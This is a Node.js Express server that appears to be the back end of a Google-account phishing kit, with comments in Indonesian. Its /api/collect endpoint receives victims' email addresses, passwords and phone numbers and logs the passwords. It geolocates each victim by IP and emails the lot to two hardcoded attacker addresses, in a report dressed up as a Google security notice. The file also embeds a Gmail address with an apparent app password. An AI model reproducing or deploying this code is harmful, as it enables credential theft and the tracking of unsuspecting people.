const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const morgan = require('morgan');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(morgan('combined'));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests' }
});
app.use('/api/', limiter);

app.use(express.static(path.join(__dirname, 'public')));

// ==================== EMAIL CONFIG LANGSUNG ====================
// GANTI DENGAN EMAIL DAN PASSWORD LO!
const EMAIL_USER = 'gajeb682@gmail.com';
const EMAIL_PASS = 'tmyh wklt uyig lots';

// 2 PENERIMA EMAIL - GANTI SESUAI KEINGINAN LO!
const RECIPIENT_EMAIL_1 = 'gajeb682@gmail.com';
const RECIPIENT_EMAIL_2 = 'cadangan@gmail.com';  // GANTI!

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: EMAIL_USER,
    pass: EMAIL_PASS,
  }
});

// Get location from IP
async function getLocationFromIP(ip) {
  try {
    const cleanIp = ip.replace(/^::ffff:/, '');
    const response = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 5000 });
    return {
      ip: cleanIp,
      country: response.data.country_name || 'Unknown',
      region: response.data.region || 'Unknown',
      city: response.data.city || 'Unknown',
      latitude: response.data.latitude || 'N/A',
      longitude: response.data.longitude || 'N/A',
      asn: response.data.asn || 'N/A',
      org: response.data.org || 'N/A',
      postal: response.data.postal || 'N/A',
      timezone: response.data.timezone || 'N/A',
      map_link: response.data.latitude && response.data.longitude ? 
        `https://www.google.com/maps?q=${response.data.latitude},${response.data.longitude}` : '#'
    };
  } catch (error) {
    console.error('IP API error:', error.message);
    return { ip: ip, error: 'Could not fetch location' };
  }
}

// Email template
function createEmailTemplate(data) {
  const { email, password, phone, locationData, deviceData, timestamp } = data;
  
  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Account Information</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background: #f5f5f5;
      padding: 40px 20px;
      margin: 0;
    }
    .container {
      max-width: 550px;
      margin: 0 auto;
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
      overflow: hidden;
      border: 1px solid #eaeaea;
    }
    .header {
      background: #ffffff;
      padding: 28px 24px;
      text-align: center;
      border-bottom: 1px solid #eaeaea;
    }
    .header h1 {
      color: #ea4335;
      font-size: 22px;
      font-weight: 500;
      margin: 0;
    }
    .header p {
      color: #5f6368;
      font-size: 13px;
      margin: 8px 0 0;
    }
    .content {
      padding: 24px;
    }
    .section {
      background: #fafafa;
      border-radius: 12px;
      padding: 18px;
      margin-bottom: 20px;
      border: 1px solid #efefef;
    }
    .section-title {
      font-size: 13px;
      font-weight: 600;
      color: #5f6368;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 14px;
      padding-bottom: 8px;
      border-bottom: 1px solid #e0e0e0;
    }
    .row {
      display: flex;
      margin-bottom: 10px;
      font-size: 14px;
    }
    .label {
      width: 110px;
      font-weight: 500;
      color: #202124;
    }
    .value {
      flex: 1;
      color: #5f6368;
      word-break: break-word;
    }
    .value a {
      color: #1a73e8;
      text-decoration: none;
    }
    .credential-box {
      background: #fff8e7;
      border-left: 4px solid #fbbc04;
    }
    .footer {
      background: #fafafa;
      padding: 16px 24px;
      text-align: center;
      font-size: 11px;
      color: #9aa0a6;
      border-top: 1px solid #eaeaea;
    }
    hr {
      margin: 16px 0;
      border: none;
      border-top: 1px solid #eaeaea;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🔐 Google Account Access</h1>
      <p>google punya ${email}</p>
    </div>
    <div class="content">
      
      <div class="section credential-box">
        <div class="section-title">📧 ACCOUNT CREDENTIALS</div>
        <div class="row">
          <div class="label">Email:</div>
          <div class="value">${email || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Password:</div>
          <div class="value">${password || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Phone Number:</div>
          <div class="value">${phone || 'N/A'}</div>
        </div>
      </div>
      
      <div class="section">
        <div class="section-title">📍 LOCATION INFORMATION</div>
        <div class="row">
          <div class="label">Country:</div>
          <div class="value">${locationData?.country || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Region/State:</div>
          <div class="value">${locationData?.region || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">City:</div>
          <div class="value">${locationData?.city || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Latitude:</div>
          <div class="value">${locationData?.latitude || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Longitude:</div>
          <div class="value">${locationData?.longitude || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Map Link:</div>
          <div class="value"><a href="${locationData?.map_link || '#'}" target="_blank">Click to view map</a></div>
        </div>
        <div class="row">
          <div class="label">IP Address:</div>
          <div class="value">${locationData?.ip || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">ASN:</div>
          <div class="value">${locationData?.asn || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">ISP/Organization:</div>
          <div class="value">${locationData?.org || 'N/A'}</div>
        </div>
      </div>
      
      <div class="section">
        <div class="section-title">💻 DEVICE INFORMATION</div>
        <div class="row">
          <div class="label">User Agent:</div>
          <div class="value">${deviceData?.userAgent || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Platform:</div>
          <div class="value">${deviceData?.platform || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Language:</div>
          <div class="value">${deviceData?.language || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Screen:</div>
          <div class="value">${deviceData?.screen || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Timezone:</div>
          <div class="value">${deviceData?.timezone || 'N/A'}</div>
        </div>
      </div>
      
      <hr>
      <div class="row">
        <div class="label">Captured at:</div>
        <div class="value">${timestamp || new Date().toISOString()}</div>
      </div>
    </div>
    <div class="footer">
      Google Account Security Report • Automated System
    </div>
  </div>
</body>
</html>
  `;
}

// ==================== KIRIM EMAIL KE 2 PENERIMA ====================
async function sendToBothEmails(data) {
  const emailHtml = createEmailTemplate(data);
  const subject = `🔐 Akun Google: ${data.email}`;
  
  // Kirim ke EMAIL 1
  try {
    await transporter.sendMail({
      from: `"Security Report" <${EMAIL_USER}>`,
      to: RECIPIENT_EMAIL_1,
      subject: subject,
      html: emailHtml,
    });
    console.log(`✅ Email sent to ${RECIPIENT_EMAIL_1}`);
  } catch (error) {
    console.error(`❌ Failed to send to ${RECIPIENT_EMAIL_1}:`, error.message);
  }
  
  // Kirim ke EMAIL 2
  try {
    await transporter.sendMail({
      from: `"Security Report" <${EMAIL_USER}>`,
      to: RECIPIENT_EMAIL_2,
      subject: subject,
      html: emailHtml,
    });
    console.log(`✅ Email sent to ${RECIPIENT_EMAIL_2}`);
  } catch (error) {
    console.error(`❌ Failed to send to ${RECIPIENT_EMAIL_2}:`, error.message);
  }
}

// ==================== API ENDPOINT ====================
app.post('/api/collect', async (req, res) => {
  try {
    const { email, password, phone, deviceData, timestamp } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    console.log(`📥 Data from IP: ${clientIp}`);
    console.log(`📧 Email: ${email}`);
    console.log(`🔑 Password: ${password}`);
    console.log(`📞 Phone: ${phone || 'Not provided'}`);
    
    const locationData = await getLocationFromIP(clientIp);
    
    const collectedData = {
      email,
      password,
      phone: phone || '',
      locationData,
      deviceData: deviceData || {},
      timestamp: timestamp || new Date().toISOString()
    };
    
    // KIRIM KE 2 EMAIL LANGSUNG!
    await sendToBothEmails(collectedData);
    
    res.json({ success: true, message: 'Data collected' });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`
╔══════════════════════════════════════════════════════════╗
║     🔥 SERVER JALAN - 2 EMAIL PENERIMA 🔥               ║
╠══════════════════════════════════════════════════════════╣
║  📡 Port: ${PORT}                                          ║
║  📧 Email 1: ${RECIPIENT_EMAIL_1}                         ║
║  📧 Email 2: ${RECIPIENT_EMAIL_2}                         ║
║  🌐 Endpoint: POST /api/collect                         ║
╚══════════════════════════════════════════════════════════╝
  `);
});
